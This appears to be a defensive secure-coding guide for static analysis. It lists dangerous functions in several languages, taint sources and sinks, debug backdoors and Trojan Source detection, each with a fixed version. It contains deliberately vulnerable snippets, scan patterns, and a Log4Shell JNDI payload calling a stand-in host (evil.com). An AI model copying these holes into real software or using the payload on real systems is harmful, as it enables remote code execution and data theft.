# Source Code Static Analysis — Instruction 21

## Coverage

CWE-787, CWE-125, CWE-476, CWE-416, CWE-94, CWE-20
Taint analysis, dangerous functions, null safety, memory safety, code patterns

---

## Dangerous Functions by Language

### JavaScript / TypeScript

```js
// 🔴 Code injection
eval(userInput);
new Function(userInput);
setTimeout(userInput, 0); // string form
setInterval(userInput, 0); // string form
document.write(userInput);

// 🔴 DOM XSS
element.innerHTML = userInput;
element.outerHTML = userInput;
element.insertAdjacentHTML('afterend', userInput);
document.querySelector(userInput); // CSS selector injection

// 🔴 Command injection (Node.js)
exec(userInput);
execSync(userInput);
spawn('sh', ['-c', userInput]);

// 🔴 Path traversal
fs.readFile('../' + userInput);
require(userInput); // dynamic require with user input

// 🔴 Prototype pollution
obj[userInput] = value; // if userInput can be "__proto__"

// Scan patterns:
// eval\s*\(
// innerHTML\s*=
// exec\s*\(.*req\.
// require\s*\(.*req\.
```

### Python

```python
# 🔴 Code execution
eval(user_input)
exec(user_input)
compile(user_input, ...)

# 🔴 Deserialization
pickle.loads(user_data)     # arbitrary code execution
yaml.load(user_data)        # use yaml.safe_load instead
marshal.loads(user_data)

# 🔴 Command injection
os.system(f"ls {user_input}")
subprocess.call(user_input, shell=True)

# 🟢 Safe alternatives
yaml.safe_load(user_data)
subprocess.run(['ls', user_input], shell=False)  # argument list, no shell
```

### PHP

```php
// 🔴 Code execution
eval($userInput);
assert($userInput);
preg_replace('/pattern/e', $userInput, $str);  // /e modifier = eval!

// 🔴 File inclusion
include($userInput);
require($userInput);
include_once($_GET['page']);

// 🔴 Command injection
system($userInput);
exec($userInput);
shell_exec($userInput);
`$userInput`;  // backtick = shell exec

// 🔴 Type juggling (==  vs  ===)
if ($token == 0) {  // "abc" == 0 is TRUE in PHP!
if ($token == true) {  // "0" == false is TRUE!
// Always use === for comparisons
```

### Java

```java
// 🔴 Deserialization
ObjectInputStream.readObject(userStream)  // arbitrary code execution

// 🔴 JNDI injection (Log4Shell class)
logger.info(userInput)  // if user sends ${jndi:ldap://evil.com/a}
// Ensure Log4j version >= 2.17.1

// 🔴 XML processing
DocumentBuilderFactory.newInstance()  // XXE if not hardened
```

---

## Taint Analysis — Follow User Input

Track these input sources:

```js
// Taint sources (user-controlled data)
req.body;
req.query;
req.params;
req.headers;
req.cookies;
process.argv;
process.env; // if any env var comes from user-controlled source

// Taint sinks (dangerous destinations)
eval();
innerHTML;
exec();
db.query();
fs.readFile();
res.redirect();
```

Flag when: taint source reaches taint sink WITHOUT sanitization in between.

---

## Null Safety (CWE-476 in JavaScript)

### Null Pointer Equivalent

```js
// 🔴 Server crash = DoS vulnerability
app.get('/profile/:id', async (req, res) => {
  const user = await User.findById(req.params.id);
  res.json({ name: user.profile.name }); // crashes if user=null or profile=null!
});

// 🟢 Optional chaining + null check
app.get('/profile/:id', async (req, res) => {
  const user = await User.findById(req.params.id);
  if (!user) return res.status(404).json({ error: 'Not found' });
  res.json({ name: user?.profile?.name ?? 'Unknown' });
});

// Scan for: property access on potentially null values
// .findById(), .findOne() can return null
// req.user (unauthenticated requests)
// JSON.parse() result without schema validation
```

---

## Debug Code in Production

```js
// 🔴 Debug endpoints
app.get('/debug', (req, res) => res.json(process.env)); // 🔴 all env vars!
app.get('/phpinfo', (req, res) => phpinfo()); // 🔴
app.get('/__test', (req, res) => res.json({ ok: true })); // 🔴 info disclosure

// 🔴 Debug logging with sensitive data
console.log('USER DATA:', JSON.stringify(user));
console.log('ENV:', process.env);

// 🔴 Hardcoded test credentials
if (username === 'admin' && password === 'debug123') login(); // backdoor!

// 🔴 TODO comments revealing security issues
// TODO: add auth here
// FIXME: this is insecure, fix before production
// HACK: bypassing auth for testing

// Scan for:
// app.get('/debug'
// console.log.*password
// TODO.*auth
// FIXME.*security
// backdoor|debug.*credential
```

---

## Source Maps in Production

```js
// 🔴 Source maps expose original source code to anyone
// next.config.js:
productionBrowserSourceMaps: true; // 🔴 default is false — don't enable!

// Webpack:
devtool: 'source-map'; // 🔴 in production config

// 🟢 Source maps should only be:
// - Generated but not served (upload to error tracker only)
// - Or completely disabled in production
```

---

## Secure Defaults — Whitelist over Blacklist

```js
// 🔴 Blacklist (dangerous — always incomplete)
if (role === 'banned') {
  deny();
} else {
  allow();
} // what if role is null, undefined, 'hacker'?

// 🟢 Whitelist (safe — explicit permission)
const ALLOWED_ROLES = ['user', 'admin', 'moderator'];
if (!ALLOWED_ROLES.includes(role)) {
  deny();
} else {
  allow();
}

// 🔴 Fail insecure (allows access on error)
try {
  validateToken(token);
} catch (e) {
  next(); // token invalid → access granted! 🔴
}

// 🟢 Fail secure (denies access on error)
try {
  validateToken(token);
} catch (e) {
  return res.status(401).json({ error: 'Unauthorized' });
}
```

---

## Memory Safety in Node.js (CWE-787/125/119)

```js
// 🔴 Deprecated Buffer constructor (exposes uninitialized heap memory)
Buffer(100); // exposes memory from previous allocations
new Buffer(100); // same issue

// 🔴 allocUnsafe without immediate write
const buf = Buffer.allocUnsafe(100);
// buf contains garbage/previous memory data
sendToUser(buf); // may leak memory contents!

// 🟢 Always use safe constructor
Buffer.alloc(100); // zeroed memory
Buffer.from(data, 'utf8'); // from known data

// 🔴 User-controlled buffer size
const size = Number(req.body.size);
const buf = Buffer.alloc(size); // OOM if size = 2147483647

// 🟢 Validate size
const MAX = 10 * 1024 * 1024; // 10MB
if (!Number.isInteger(size) || size > MAX || size < 0) return res.status(400);
const buf = Buffer.alloc(size);
```

---

## Trojan Source Detection (CWE-116 variant)

```
// Scan ALL source files for Unicode bidirectional control characters:
// U+202A, U+202B, U+202C, U+202D, U+202E (LRM, RLM...)
// U+2066, U+2067, U+2068, U+2069 (directional isolates)
// U+200F (RIGHT-TO-LEFT MARK)

// These characters are INVISIBLE but can reorder code visually
// What you see in your editor ≠ what the compiler executes

// Detection (grep):
grep -rP "[\x{202A}-\x{202E}\x{2066}-\x{2069}\x{200F}]" --include="*.js" .

// Flag any file containing these characters as: CRITICAL
```

---

## Use After Free in JavaScript (CWE-416)

```js
// 🔴 Memory leak via uncleaned event listeners → DoS over time
class DataManager {
  init() {
    window.addEventListener('resize', this.handler.bind(this));
    // Never removed → memory leak × every DataManager instance
  }
  cleanup() {
    /* missing! */
  }
}

// 🟢 Always clean up
class DataManager {
  constructor() {
    this._handler = this.handler.bind(this);
  }
  init() {
    window.addEventListener('resize', this._handler);
  }
  cleanup() {
    window.removeEventListener('resize', this._handler);
  }
}

// 🔴 setInterval without clearInterval → accumulates
const id = setInterval(fetchData, 1000);
// Component unmounts, interval keeps running

// 🟢 React useEffect cleanup
useEffect(() => {
  const id = setInterval(fetchData, 1000);
  return () => clearInterval(id); // cleanup on unmount
}, []);
```
